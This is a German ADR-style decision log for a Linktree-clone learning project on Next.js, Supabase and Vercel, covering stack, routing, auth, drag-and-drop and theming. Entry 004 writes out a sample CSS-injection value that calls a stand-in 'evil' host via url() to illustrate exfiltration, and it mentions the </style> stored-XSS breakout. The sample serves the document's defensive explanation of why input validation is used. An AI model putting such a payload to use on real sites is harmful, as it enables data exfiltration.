# Guidelines — Architektur-Entscheidungen

Jede Grundsatzentscheidung wird hier als nummerierter Eintrag festgehalten, im ADR-Stil:
**Kontext** (Situation, in der entschieden wurde) / **Entscheidung** (was gilt) / **Warum** (die tragenden Gründe) / **Alternativen** (was geprüft und warum verworfen wurde).

Der Sinn: In drei Wochen weiß niemand mehr, warum etwas so gebaut wurde. Hier steht es.

---

## 001 — Stack-Entscheidung: Next.js + Supabase + Vercel + npm

**Kontext**
Ein Linktree-Clone braucht drei Dinge: öffentliche Seiten, die schnell laden und von Suchmaschinen gelesen werden können (`/u/<username>`), einen geschützten Bereich mit Login, und eine Datenbank, in der Profile und Links liegen. Das Projekt ist ein Lernprojekt für Einsteiger ins Agentic Coding und wird von einer Person gebaut. Es gibt kein Budget für bezahlte Infrastruktur und niemanden, der einen Server administriert.

**Entscheidung**
- **Next.js (App Router)** als einziges Framework für Frontend *und* Backend. Datenmutationen laufen über Server Actions, öffentliche Seiten werden serverseitig gerendert.
- **Supabase** als Backend-as-a-Service: Postgres-Datenbank, Email/Passwort-Auth und Row Level Security aus einer Hand.
- **Vercel** als Deployment-Ziel.
- **npm** als Paketmanager.

**Warum**
- *Ein Framework statt zwei Projekte.* Front- und Backend liegen im selben Repo, teilen sich TypeScript-Typen und werden in einem Schritt deployt. Für einen Einsteiger fällt damit die gesamte Klasse von Problemen weg, die aus zwei getrennt laufenden Prozessen entsteht: CORS, doppelte Auth-Logik, zwei Deployments, API-Verträge, die auseinanderlaufen. Server Actions sind nur Funktionen mit `"use server"` — kein Router, kein Controller, kein HTTP-Client.
- *Next.js löst das Kernproblem der App direkt.* Die öffentlichen Profilseiten sind das Produkt. Server-Rendering liefert sie ohne Client-Roundtrip aus, inklusive Meta-Tags für Link-Vorschauen beim Teilen.
- *Supabase liefert Postgres + Auth + RLS im Free Tier, ohne eigenen Server.* Eine echte relationale Datenbank mit Foreign Keys und Constraints — passend, weil die Daten hier klar relational sind (ein User hat viele Links in fester Reihenfolge). Auth ist eingebaut: Registrierung, Login, Session-Handling und Passwort-Hashing muss niemand selbst schreiben, und selbstgebaute Auth ist genau die Stelle, an der Anfängerprojekte unsicher werden. Row Level Security setzt die Zugriffsregeln in der Datenbank durch, nicht erst im Anwendungscode: Selbst wenn eine Server Action einen Filter vergisst, gibt Postgres keine fremden Zeilen heraus. Das ist für ein Lernprojekt der wichtigste einzelne Sicherheitsgewinn.
- *Vercel Hobby ist kostenlos und stammt von denselben Machern wie Next.js.* Deployment per Git-Push, Preview-URLs pro Branch, Server Actions und Middleware laufen ohne Konfiguration. Es gibt keine Build-Pipeline zu bauen.
- *npm ist mit Node.js vorinstalliert.* Kein zusätzlicher Installationsschritt, keine Lockfile-Verwirrung, jede Anleitung im Netz passt ohne Übersetzung. Der Performance-Vorteil schnellerer Alternativen ist bei einem Projekt dieser Größe messbar, aber irrelevant.

**Alternativen**
- **Separates Express-Backend (+ React-SPA):** Verworfen. Zwei Repos oder zumindest zwei Prozesse, zwei Deployments, CORS-Konfiguration, manuell gepflegte Typen zwischen Client und Server, selbstgebaute Session-Verwaltung. Der Lerneffekt („so funktioniert ein REST-Backend") rechtfertigt den Aufwand hier nicht — das Projekt soll eine App liefern, keine Infrastruktur-Übung sein.
- **Firebase statt Supabase:** Verworfen. Firestore ist dokumentenorientiert; die geordnete Link-Liste pro User und die Eindeutigkeit von `username` lassen sich in Postgres mit `unique`-Constraint und `position`-Spalte sauber ausdrücken, in Firestore nur mit Konventionen und Client-Disziplin. Dazu kommt: Firebase Security Rules sind eine eigene Sprache, RLS ist normales SQL — und SQL ist übertragbares Wissen. Vendor-Lock-in ist bei Supabase geringer, weil darunter ein gewöhnliches Postgres liegt, das man exportieren kann.
- **Netlify statt Vercel:** Verworfen. Funktioniert grundsätzlich, aber Next.js-Features (App Router, Server Actions, Middleware) kommen dort über einen Adapter-Layer und hinken neuen Releases hinterher. Auf Vercel ist Next.js die Referenzplattform — bei einem Lernprojekt will man Fehler im eigenen Code suchen, nicht im Adapter.
- **pnpm statt npm:** Verworfen. Schneller und plattensparsamer, aber ein zusätzliches Werkzeug, das erst installiert und verstanden werden muss, und dessen strikte Modulauflösung gelegentlich Pakete stolpern lässt. Für ein Einzelprojekt mit überschaubaren Dependencies kein spürbarer Gewinn.

---

## 002 — URL-Struktur, Username-Claim und unbekannte Namen

*Entschieden am 14.08.2026 in der Sparringssession (Phase 2), auf Basis von `references/discovery.md` Abschnitt 1.*

**Kontext**
Die öffentliche Seite ist das Produkt. Ihre URL entscheidet über zwei Folgeprobleme: ob Usernamen mit App-Routen kollidieren können, und wann im Flow der Name überhaupt festgelegt wird.

**Entscheidung**
- Öffentliche Seiten liegen unter **`/u/<username>`**.
- Der Username wird **nicht** im Sign-up erfasst, sondern in einem **eigenen Onboarding-Screen** nach der Registrierung. Dieser Screen fragt **nur den Username** ab.
- `profiles.username` ist damit **nullable**. Der Sign-up-Trigger legt das Profil ohne Namen an — **kein** generierter Fallback wie `user_a1b2c3`.
- Wer eingeloggt ist und noch keinen Username hat, wird von überall auf **`/onboarding` zwangsweise umgeleitet**.
- Regeln: **3–30 Zeichen**, erlaubt sind `a-z`, `0-9`, `_`, `-` (nur Kleinbuchstaben). Reserviert: `admin`, `root`, `api`, `auth`, `login`, `logout`, `dashboard`, `settings`, `onboarding`, `u`, `www`, `support`, `help`.
- `/u/<unbekannter-name>` zeigt **keine 404-Seite, sondern eine Claim-Seite** („Dieser Name ist noch frei") mit Weiterleitung ins Sign-up.

**Warum**
- Das Präfix `/u/` trennt den Namespace physisch. Jede neue App-Route kann ohne Rücksicht auf bestehende Usernamen angelegt werden, und die Sperrliste bleibt kurz — sie schützt nur noch gegen Verwechslung, nicht gegen echte Routing-Konflikte.
- Der eigene Onboarding-Screen hält das Sign-up-Formular bei zwei Feldern. Der Preis ist ein zusätzlicher Zustand („User ohne Username"), und genau deshalb wird er per **Forced Redirect** sofort wieder aufgelöst: Es gibt exakt einen Weg durch die App, und keine Komponente muss den halbfertigen Fall abfangen. Ein Banner-Ansatz hätte bedeutet, dass Public-Link, Preview und Teilen-Button überall einen Sonderfall brauchen.
- Kein generierter Fallback-Username, weil sonst jeder Nutzer mit einem Namen startet, den er nie gewählt hat — und den er, sobald er einmal in der DB steht, aktiv korrigieren muss.
- Die Claim-Seite ist der Wachstumsweg echter Anbieter: Ein geteilter, noch nicht existierender Name wird zur Einladung statt zur Sackgasse.

**Alternativen**
- **`/<username>` ohne Präfix:** Verworfen. Schönere URL, aber jede neue Route wird zum potenziellen Konflikt und die Sperrliste zur Dauerbaustelle. Für eine Demo ist das Risiko ohne Gegenwert.
- **Subdomain `<username>.domain`:** Verworfen. Wildcard-DNS plus Wildcard-Zertifikat, auf Vercel Hobby zusätzlich fummelig — Aufwand ohne Nutzergewinn, den kein großer Anbieter auf sich nimmt.
- **Username im Sign-up-Formular:** Verworfen trotz Empfehlung aus der Discovery. Drei Felder in einem Schritt wären der kürzere Weg gewesen; der getrennte Screen wurde bewusst gewählt, um Registrierung und Namenswahl als zwei verständliche Schritte zu zeigen.
- **404 statt Claim-Seite:** Verworfen. Bewusst in Kauf genommener Nachteil: Die Claim-Seite verrät durch Ausprobieren, welche Namen vergeben sind (*Username-Enumeration*). Bei einer Demo ohne sensible Daten ist das vertretbar; in einem Produktivsystem wäre die Abwägung neu zu treffen.

---

## 003 — Drag-and-Drop mit Framer Motion Reorder

*Entschieden am 14.08.2026. Diese Entscheidung weicht bewusst von der Empfehlung in `references/discovery.md` Abschnitt 4 ab.*

**Kontext**
Links werden per Drag-and-Drop sortiert. Die Discovery hat **dnd-kit** empfohlen, weil Motion `Reorder` keine Tastatur-Bedienung mitbringt, auf Mobile mit dem Seiten-Scrolling kollidiert und `onReorder` kontinuierlich während des Ziehens feuert.

**Entscheidung**
**Framer Motion (`motion`) mit `Reorder`**, ergänzt um vier Pflicht-Maßnahmen, die die bekannten Schwächen abfangen:
1. **Drag-Handle** statt ziehbarer Gesamtkarte: `dragListener={false}` + `useDragControls`, `touch-action: none` **ausschließlich auf dem Handle**.
2. **Gespeichert wird bei Drag-Ende**, nicht in `onReorder`. `onReorder` aktualisiert nur den lokalen State.
3. **`position: relative`** auf jedem Item (sonst greift Motions z-index-Handling beim Ziehen nicht).
4. **Hoch/Runter-Buttons an jeder Karte**, die dieselbe Speicher-Funktion aufrufen — sie ersetzen die fehlende Tastatur-Bedienung.

`motion` ist mit Spec 06 installiert worden: **`motion@13.1.0`**, Import aus `motion/react`.

**Warum**
- Bewusste Abwägung zugunsten des Kurs-Zusammenhangs: Motion ist ohnehin für Page-Transitions und Hover-States der öffentlichen Seite vorgesehen, und `Reorder` ist die deutlich kleinere API-Oberfläche zum Erklären.
- Die vier Maßnahmen adressieren jede der drei dokumentierten Schwächen direkt. Die Hoch/Runter-Buttons sind dabei kein reiner Ersatz: Auf Mobile sind sie oft angenehmer als Ziehen, und sie machen die Liste vollständig per Tastatur bedienbar.
- Punkt 2 ist der kritische: Wird in `onReorder` gespeichert, entstehen pro Drag dutzende Server-Action-Aufrufe. Das ist beim Bauen zu prüfen, nicht nur zu vermuten.

**Alternativen**
- **dnd-kit v1** (`@dnd-kit/core` + `@dnd-kit/sortable`): Von der Discovery empfohlen — Keyboard-Sensor und ARIA-Live-Region out of the box, `onDragEnd` feuert genau einmal, saubere Touch-Aktivierungs-Constraints. Verworfen zugunsten der einheitlichen Motion-Basis; Begründung und Vergleichstabelle stehen in `references/discovery.md`. Falls die Mobile-Verifikation (siehe unten) scheitert, ist dnd-kit der vorgesehene Rückfallweg.
- **dnd-kit v2** (`@dnd-kit/react@0.5.0`): Verworfen — `0.x`, Breaking Changes während der Projektlaufzeit zu erwarten.
- **react-beautiful-dnd:** Disqualifiziert. Auf npm deprecated, Repo archiviert, kein React 18+.
- **Native HTML5-Drag-API:** Disqualifiziert. `dragstart` feuert auf iOS/Android nicht — kein Touch-Support.

**Verifikations-Auflage**
Das Arbeitspaket gilt erst als fertig, wenn das Reordering **im Mobile-Emulationsmodus** geprüft wurde. Die dokumentierten Motion-Bugs wurden ausnahmslos erst dort sichtbar.

---

## 004 — Accent-Color: Speicherung, Injektion und Kontrast

*Entschieden am 14.08.2026, auf Basis von `references/discovery.md` Abschnitt 3.*

**Kontext**
Jeder User wählt eine Akzentfarbe, die seine öffentliche Seite einfärbt. Ein user-gelieferter Wert, der in CSS landet, ist ein klassischer Injektionspfad.

**Entscheidung**
- Speicherung als **eine Spalte** `accent_color text not null default '#6366f1'` mit `check (accent_color ~* '^#[0-9a-f]{6}$')`. Kein JSONB. *(Spalte und Constraint existieren bereits aus dem Supabase-Setup; die Recherche in `references/discovery.md` schlug `#6d28d9` vor — es gilt der tatsächliche Datenbankwert `#6366f1`.)*
- Überschrieben wird ein **eigener Token `--brand`**, nicht `--accent`.
- Injektion **ausschließlich** über `style={{ "--brand": … } as React.CSSProperties}` auf dem obersten Element von `/u/[username]`. **`<style dangerouslySetInnerHTML>` ist im gesamten Projekt verboten.**
- Eine einzige Torwächter-Funktion `safeAccent()` in `src/lib/theme.ts`. Sie wirft nie, sondern fällt auf den Default zurück. **Projektregel: kein Farbwert erreicht JSX, ohne durch `safeAccent()` gegangen zu sein.**
- Abgeleitete Töne (Hover, Subtle, Ring) über `color-mix(in oklab, …)`.
- Die Textfarbe auf der Akzentfläche wird **automatisch** bestimmt: `luminance(hex) > 0.17913 ? schwarz : weiß`, gesetzt als `--brand-foreground` auf denselben Wrapper.
- Auswahl im UI: **8 Presets als Swatches plus freier `<input type="color">`**. Beide Wege laufen durch dieselbe Validierung.
- Statische **CSP-Header** in `next.config.ts`, ohne Nonce.

**Warum**
- *Spalte statt JSONB:* JSONB lässt sich nicht sauber per CHECK absichern — jeder Key bräuchte einen eigenen Ausdruck, der bei fehlendem Key auf NULL läuft und stillschweigend durchgeht. Die Spalte gibt uns die dritte Validierungsschicht (Client → Server Action → DB) geschenkt. Das Erweiterbarkeits-Argument trägt nicht: `ALTER TABLE ADD COLUMN` ist seit PG 11 eine reine Metadaten-Operation.
- *`--brand` statt `--accent`:* `--accent` ist in `globals.css` bereits shadcns heller Hover-Ton — für Ghost-Buttons, Dropdown-Items, Command-Menü. Ein Override mit einer gesättigten Nutzerfarbe würde jeden Hover-State der Seite knallbunt machen, und `--accent-foreground` passte nicht mehr dazu.
- *Kein `dangerouslySetInnerHTML`:* React escapt Custom Properties im SSR über `escapeTextForBrowser` (`" & ' < >`), im Client laufen sie über `CSSStyleDeclaration.setProperty()`. In beiden Pfaden ist ein Kontext-Ausbruch strukturell unmöglich. In einem `<style>`-Tag greift dieser Schutz **nicht** — dort ist der `</style>`-Breakout echter Stored XSS. Genau so war die ApostropheCMS-Lücke GHSA-97v6-998m-fp4g gebaut.
- *Die Validierung ist die eigentliche Schutzschicht, nicht Kosmetik:* React escapt im SSR **kein Semikolon**. Ein Wert wie `red;position:fixed;inset:0;background:url(https://evil/?x)` erzeugt zusätzliche Deklarationen im selben Attribut — kein XSS, aber Overlay-Fläche und Exfiltration per `url()`. Der Whitelist-Regex schließt Semikolons per Konstruktion aus.
- *Automatischer Kontrast:* Am Gleichstandspunkt L = 0.17913 beträgt der Kontrast 4.58:1. Damit erfüllt **jede** denkbare Akzentfarbe WCAG AA für Normaltext — kein Sonderfall, keine Warnung an den Nutzer. Kostet einen Vergleich und keine Dependency. Kein Anbieter am Markt macht das; hier sind wir besser als die Vorbilder.

**Alternativen**
- **JSONB-Theme-Objekt:** Verworfen, siehe oben.
- **CSP mit Nonce:** Verworfen. Erzwingt laut Next-Doku dynamisches Rendering für *alle* Seiten (Static Optimization, ISR und PPR fallen weg) — und deckt Inline-`style`-**Attribute** nicht einmal ab, dafür wäre `style-src-attr` zuständig.
- **DOMPurify o. ä.:** Verworfen. Sanitisiert HTML, nicht CSS-Werte. Der Regex ist die schärfere und billigere Prüfung.
- **Relative Color Syntax** statt `color-mix()`: Verworfen. Jünger, mit Safari-Sonderfall, ohne Mehrwert für Hover/Subtle/Ring.
- **Nur Presets** oder **nur Picker:** Beide verworfen. Presets allein hätten die Validierung zur Formsache gemacht, der Picker allein nimmt den schnellen Weg zu einem guten Ergebnis.

---

## 005 — Auth-Architektur unter Next.js 16 und @supabase/ssr 0.12

*Entschieden am 14.08.2026, auf Basis von `references/discovery.md` Abschnitt 2. Die Fakten stammen aus Context7 und den lokal installierten Typdefinitionen, nicht aus Erinnerung.*

**Kontext**
Supabase-Auth im App Router ist der häufigste Fehlerpunkt solcher Projekte, und die API hat sich mehrfach geändert. Zwei Details weichen von praktisch allen auffindbaren Tutorials ab.

**Entscheidung**
- Die Datei heißt **`proxy.ts`**, der Export **`proxy`** — nicht `middleware.ts`. In Next 16 ist die alte Konvention deprecated und umbenannt.
- **`setAll(cookiesToSet, headers)` wird mit beiden Argumenten implementiert**, und die übergebenen Header werden im Proxy auf die Response gesetzt. In `lib/supabase/server.ts` wird das zweite Argument bewusst ignoriert (Server Components können keine Header setzen).
- Durchgängig **`getClaims()`** für Route-Schutz und Identität. `getUser()` nur, wenn wirklich der frische User-Record gebraucht wird. **`getSession()` serverseitig gar nicht.** Dazu im Supabase-Dashboard auf asymmetrische JWT Signing Keys umstellen.
- **Guard doppelt:** Redirect im Proxy für die Navigation, `getClaims()`-Check in `app/dashboard/layout.tsx` als eigentliche Absicherung. Beides ersetzt **nicht** RLS.
- Proxy-Whitelist muss **`/`, `/login`, `/auth` und `/u`** enthalten.
- **Passwort-Minimum 8**, keine Zeichenklassen-Pflicht.
- `profiles` wird per **DB-Trigger** auf `auth.users` angelegt, mit `set search_path = ''` und `on delete cascade`; die Verfügbarkeit des Usernamens wird in der Server Action **vorab geprüft**, der `unique`-Constraint bleibt die harte Absicherung.
- Fehler landen über `useActionState` **als Text im Formular**, nicht per `redirect('/error')`. Login-Fehler bleiben generisch („E-Mail oder Passwort ist falsch").
- Env-Variablen: `NEXT_PUBLIC_SUPABASE_URL` und `NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY`.
- **E-Mail-Bestätigung bleibt für die Entwicklung abgeschaltet**, vor einem echten Deploy wieder an.

**Warum**
- *Der `headers`-Parameter ist kein Detail.* `@supabase/ssr` übergibt dort `Cache-Control: private, no-cache, no-store, …`. Wird er ignoriert, kann ein CDN eine Session-Response cachen und **die Session eines Nutzers an einen anderen ausliefern**. Die Signatur wurde in `node_modules/@supabase/ssr/dist/main/types.d.ts` verifiziert.
- *`getClaims()` statt `getUser()`:* prüft die JWT-Signatur lokal — gleich sicher, aber ohne Netzwerk-Roundtrip pro Aufruf. Der früher verbreitete Rat „immer `getUser()`" ist überholt. Vor `getSession()` im Servercode warnt die Doku weiterhin ausdrücklich.
- *Guard doppelt,* weil der Proxy allein umgehbar ist und Next.js hier historisch CVEs hatte.
- *Trigger plus Vorab-Prüfung:* Der Trigger ist atomar und greift auch bei Signups außerhalb der App. Sein dokumentierter Nachteil — ein Fehler im Trigger lässt den ganzen Sign-up mit `Database error saving new user` scheitern, ohne brauchbare Meldung im Client — wird durch die Vorab-Prüfung entschärft, die dem Nutzer einen echten Fehlertext liefert.
- *Generische Login-Fehler* verhindern User-Enumeration über das Login-Formular. (Über die Claim-Seite ist sie bewusst in Kauf genommen, siehe 002 — ein Grund mehr, sie hier nicht zusätzlich zu öffnen.)

**Alternativen**
- **`middleware.ts` beibehalten:** Verworfen — deprecated, und für Kursteilnehmer verwirrend, wenn Doku und Code auseinanderlaufen.
- **`profiles` in der Server Action anlegen:** Verworfen. Feldgenaue Fehler wären angenehmer, aber der Insert ist nicht atomar (verwaiste Accounts), braucht eine aktive Session für die INSERT-Policy und wird von jedem zweiten Signup-Weg umgangen.
- **Leaked-Password-Schutz (HaveIBeenPwned):** Nicht verfügbar — Pro-Plan-only. Der Security Advisor meldet das auf Free als Warnung; das ist erwartbar und kein Fehler.

---

## 006 — Empty-State ohne vorbefüllte Daten

*Entschieden am 14.08.2026.*

**Kontext**
Ein frisch registrierter Nutzer hat keine Links. Die Vorbilder füllen diesen Zustand aktiv (Templates bei Bento, AI-Generierung bei Beacons).

**Entscheidung**
**Gestalteter Empty-State** — Icon, ein Satz Erklärung, ein prominenter „Ersten Link hinzufügen"-Button. **Keine** automatisch angelegten Beispiel-Links.

**Warum**
Der Nutzer sieht genau das, was tatsächlich in der Datenbank steht. Vorbefüllte Beispiel-Links machen Drag-and-Drop zwar sofort erlebbar, erzeugen aber Daten, die niemand angelegt hat — und im Kurs die Frage „woher kommt das, und wieso steht das in meiner Tabelle?". Die Ehrlichkeit des Zustands ist hier mehr wert als der schnellere erste Effekt.

**Alternativen**
- **Beispiel-Link vorbefüllen:** Verworfen, siehe oben.
- **Skeleton-Karten als Platzhalter:** Verworfen. Visuell reizvoll, aber Nutzer versuchen erfahrungsgemäß, darauf zu klicken.

---

## 007 — Link-Typen: nur URLs

*Entschieden am 14.08.2026.*

**Kontext**
Neben klassischen URLs wären `mailto:`- und `tel:`-Links eine naheliegende kleine Erweiterung.

**Entscheidung**
**Nur URLs.** Kein Typ-Feld in der Datenbank, eine einzige Validierung, eine Kartendarstellung.

**Warum**
Entspricht der „draußen"-Liste in `README.md`, die laut `CLAUDE.md` bindend ist. Ein Typ-Feld zieht typabhängige Validierung, typabhängige Icons und typabhängiges Rendering nach sich — drei Verzweigungen für einen Komfortgewinn, der nicht zum MVP-Ziel beiträgt. Die Idee ist in `backlog.md` aufgehoben.

**Alternativen**
- **URLs + `mailto`/`tel`:** Verworfen, siehe oben. Wandert in den Backlog.

---

## 008 — `is_active` bleibt im Schema, aber ohne Bedienelement

*Entschieden am 14.08.2026.*

**Kontext**
Die Tabelle `public.links` besitzt aus dem Supabase-Setup eine Spalte `is_active` (Standardwert `true`) sowie die dazu passende Policy `links_select_public_active`. Ein Schalter „Link vorübergehend ausblenden" wäre damit fast geschenkt — er steht aber **nicht** im MVP-Scope des Kickoffs.

**Entscheidung**
Die Spalte und die Policy bleiben unverändert bestehen. Es wird **kein** Bedienelement dafür gebaut. Alle Links laufen mit `is_active = true`. Die öffentliche Seite filtert weiterhin auf `is_active = true` — dieser Filter kostet nichts und hält die Policy und die Abfrage konsistent.

**Warum**
Der Scope in `README.md` ist laut `CLAUDE.md` Kernprinzip 1 bindend, und „fast geschenkt" ist genau die Begründung, mit der Projekte ihren Umfang verlieren. Die Spalte zu entfernen wäre allerdings die schlechtere Variante: Das kostet eine Migration, bricht die bestehende Policy und macht die spätere Nachrüstung teurer als das Nichtstun. Der billigste Weg ist, die Struktur stehen zu lassen und die Oberfläche schlank zu halten.

**Alternativen**
- **Schalter bauen:** Verworfen — außerhalb des Scopes, wandert in den Backlog.
- **Spalte und Policy per Migration entfernen:** Verworfen — Aufwand und Risiko ohne Gegenwert.

---

Jede weitere Grundsatzentscheidung wird nach demselben Muster als **009**, **010**, … unten angehängt — mit Datum, wenn sie eine frühere Entscheidung ersetzt. Alte Einträge werden nicht gelöscht, sondern als überholt markiert und auf den Nachfolger verwiesen.
